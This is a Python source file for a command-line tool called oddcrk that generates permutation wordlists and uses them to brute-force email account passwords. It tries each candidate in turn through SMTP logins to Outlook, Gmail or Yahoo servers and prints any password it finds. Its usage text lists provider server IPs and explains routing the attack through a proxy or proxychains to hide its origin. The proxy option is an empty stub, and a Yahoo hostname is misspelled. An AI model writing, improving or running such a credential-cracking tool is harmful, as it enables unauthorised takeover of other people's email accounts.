import subprocess
import smtplib
import time
import sys

menu = """
Usage:  python3 oddcrk.py -list [LISTNAME] -add [WORD1] [WORD2] ...
        python3 oddcrk.py -ip [IP] -usr [USERNAME] -psw [LISTNAME]
        python3 oddcrk.py -proxy [IP_PROXY] -port [PUERTO] -ip [IP] -usr [USERNAME] -psw [LISTNAME]

Options:
    -list FILE      sets the file where the generated words are saved
    -add            add the words to generate the dictionary

    -ip             set email server ip
    -usr            username to which the attack will be carried out
    -psw            file containing the dectionary to launch the attack

    Servers:
        Email: The connections made to mail servers are made through the 
        SMTP protocol. These are the Ips of some of the mos common:

        OUTLOOK ->  52.96.189.34
        GMAIL   ->  142.250.78.101
        YAHOO   ->  74.6.143.26

    Proxy:
        The tool can be used through a proxy, simply by indicating
        the proxy IP and PORT.

        -proxy      Proxy server ip
        -port       Port used by the proxy

        If you are going to use proxychain you just have
        to indicae it at the beginning of the script

        proxychains python3 oddcrk.py -ip [IP] -usr [USERNAME] -psw [LISTNAME]

"""

class Dictionary():
    def __init__(self, filename:str, lower_limit:int, upper_limit:int) -> None:
        self.__filename = filename
        self.__lower_limit = lower_limit
        self.__upper_limit = upper_limit

        self.__count = 0

        self.__list_word = []
        self.__list_generated_words = []
    def __add_items_file(self, filename:str, list_words:list):
        with open(filename, 'w') as file:
            for word in list_words:
                file.write(word+"\n")
            file.close()
    def __generator(self, len_list:int, list_words:list):
        if(len_list == 1):
            text = ""
            for word in list_words:
                text += word
            self.__list_generated_words.append(text)
            self.__count += 1
        else:
            try:
                for i in range(len_list):
                    self.__generator(len_list-1, list_words)
                    if(len_list % 2 == 0):
                        list_words[i], list_words[len_list-1] = list_words[len_list-1], list_words[i]
                    else:
                        list_words[0], list_words[len_list-1] = list_words[len_list-1], list_words[0]
            except IndexError:
                pass
    def add_items(self):
        print("\n[+]Generating Dictionary!")
        for i in range(self.__lower_limit, self.__upper_limit):
            self.__list_word.append(sys.argv[i])
            self.__count += 1

        print(f"[+]Data added successfully: {self.__count}")
        self.__count = 0

        for len_list in (1, len(self.__list_word)+1):
            self.__generator(len_list, self.__list_word[:len_list])

        print(f"[+]Number of new values generated: {self.__count}")

        self.__add_items_file(self.__filename, self.__list_generated_words)

        print(f"[+]Generated words added to file: {self.__filename}")
class Email():
    def __init__(self, ip:str, usr:str, psw:str):
        self.__ip_server = {"hotmail":"outlook.office365.com", 
                            "outlook":"outlook.office365.com",
                            "gmail":"smtp.gmail.com",
                            "yahoo":"smpt.mail.yahoo.com"}
        
        self.__ip = ip
        self.__usr = usr
        self.__psw = psw

    def __looking_server(self):
        out = subprocess.run(f"ping {self.__ip}", stdout=subprocess.DEVNULL)
        
        if(out.returncode == 1):
            return False
        else:
            return True
    def __number_lines_file(self):
        try:
            with open(self.__psw, 'r') as file:
                total_lines = sum(1 for line in file)
            file.close()

            return total_lines
        except FileNotFoundError:
            print("\n[-]The file was not found or does not exist")
            exit()
    def __starting_scanned(self):
        for service_name in self.__ip_server:
            found = self.__usr.find(service_name)
            if(found > 0):
                break                
        smtp = self.__ip_server[service_name]
        password_found = False
        try:
            with open(self.__psw, 'r') as file:
                print("[+]Starging scanned...")
                for word in file:
                    password = word[:-1]
                    try:
                        client_smtp = smtplib.SMTP(smtp, 587)
                        client_smtp.starttls()
                        client_smtp.login(self.__usr, str(password))
                        client_smtp.quit()
                        password_found = True
                        break
                    except smtplib.SMTPServerDisconnected:
                        print("[-]The smtp server has been disconnected")
                        exit()
                    except smtplib.SMTPConnectError:
                        print("[-]There was an error connecting to the smtp server")
                        exit()
                    except smtplib.SMTPAuthenticationError:
                        pass
            print("[+]Scanning completed")
            if(password_found):
                return password
            else:
                return password_found
        except FileExistsError:
            print("\n[-]The file was not found or does not exist")
            exit()
    def start_attack(self):
        print("\n[+]Starting attack!")
        if(self.__looking_server()):
            print(f"[+]The server {self.__ip} is running.")
        else:
            print("[-]The server is not working or could not be found.")
            exit()

        print(f"[+]List count: {self.__number_lines_file()} Type: alphanum")
        
        self.__start = time.time()
        self.__answer = self.__starting_scanned()
        if(self.__answer == False):
            self.__msg = "[-]Password: Not Found"
        else:
            self.__msg = f"[+]Password: {self.__answer}"
        self.__end = time.time()        

        print(f"[+]Time elapsed: {self.__end - self.__start}s")
        print(self.__msg)                
        
def main():
    if(sys.argv[1] == "-list" and sys.argv[3] == "-add"):
        dictionary = Dictionary(str(sys.argv[2]), 4, int(len(sys.argv)))
        dictionary.add_items()
        
    elif(sys.argv[1] == "-ip" and sys.argv[3] == "-usr" and sys.argv[5] == "-psw"):
        email = Email(sys.argv[2], sys.argv[4], sys.argv[6])
        email.start_attack()
    elif(sys.argv[1] == "-proxy" and sys.argv[3] == "port" and
         sys.argv[5] == "-ip" and sys.argv[7] == "-usr" and
         sys.argv[9] == "-psw"):
        pass
    else:
        print("\n[-]The selected option could not be identified.")
        print(menu)

if __name__ == "__main__":
    if(len(sys.argv) < 2):
        print(menu)
    else:
        main()